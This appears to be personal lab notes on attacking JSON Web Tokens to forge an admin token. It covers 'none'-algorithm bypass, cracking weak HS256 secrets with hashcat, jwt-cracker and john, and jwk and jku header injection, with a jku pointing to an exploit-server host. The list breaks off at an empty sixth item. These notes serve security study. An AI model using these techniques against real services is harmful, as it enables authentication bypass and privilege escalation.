### JSON Web tokens

---

JSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems. Use - authentication, session handling, and access control mechanisms.

Task : We need to generate a JWT token having an admin role instead of having a user. Finding the key used to sign is important otherwise the signature for a different payload won't be correct.

1. `Unverified signature` - No need to verify signature due to implementation flaw, just change the paramters and construct jwt.
2. `Flawed verification` - Change algo to "none" and leave the signature blank to bypass due to flawed implementation.
3. `Weak signing key HS256 (HMAC + SHA-256)` - Sometimes the JWT is encrypted with some hashing algorithm, we need to break it using 'john the ripper' or other bruteforcing tool and reconstruct the jwt. [jwt-secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)

```py
hashcat -a 0 -m 16500 <jwt> <wordlist> --show  

% jwt-cracker -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzA5OTMzODUzfQ.aDP5hVVQQN2uFQL15oTBG1B83j8MnQu0f7IRxodKm24 -d wordlists/rockyou.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

SECRET FOUND: banana
Time taken (sec): 0.123
Total attempts: 20000
```

4. `jwk header injection` - Change the required paramter then create a new RSA key, use JWT editor, embed the jwk with your newly created RSA key and send the request.

```json
{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
```

5. `jku header injection` - A JWK Set is a JSON object containing an array of JWKs representing different keys. You can see an example of this below. Add the jku paramter in header part of jwt and sign the jwt with the generated RSA key, also change the `kid` if it's already there in header.

```json
{
    "kid": "240c7c33-0eb9-46a6-bc2d-650db9188d6f",
    "alg": "RS256",
    "jku": "https://exploit-0ab2008a0391a2ea878b626601c2009c.exploit-server.net/exploit"
}
```

```json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}
```

6. 
